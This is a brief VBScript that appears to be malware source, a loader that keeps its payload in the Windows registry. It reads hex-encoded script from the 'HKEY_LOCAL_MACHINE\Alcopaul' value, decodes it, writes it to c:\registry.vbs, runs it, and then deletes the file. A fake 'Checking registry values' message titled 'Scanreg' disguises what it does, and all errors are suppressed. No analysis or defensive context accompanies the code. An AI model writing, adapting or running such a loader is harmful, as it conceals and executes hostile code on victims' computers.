on error resume next
dim e, y, z, data
e = fromreg("HKEY_LOCAL_MACHINE\Alcopaul")
function fromreg(gg)
Set regedit = CreateObject("WScript.Shell")
fromreg = regedit.regread(gg)
end function
For y = 1 to Len(e) Step 2
z = z & Chr("&h" + Mid(e, y, 2))
next
data = replace(z, Chr("&hDA"), vbcrlf)
Set fso = CreateObject("Scripting.FileSystemObject")
set h = fso.CreateTextFile("c:\registry.vbs", True)
h.Write data
h.Close
Set fsa = CreateObject("Wscript.Shell")
fsa.Run("c:\registry.vbs")
msgbox "Checking registry values", ,"Scanreg"
fso.deletefile("c:\registry.vbs")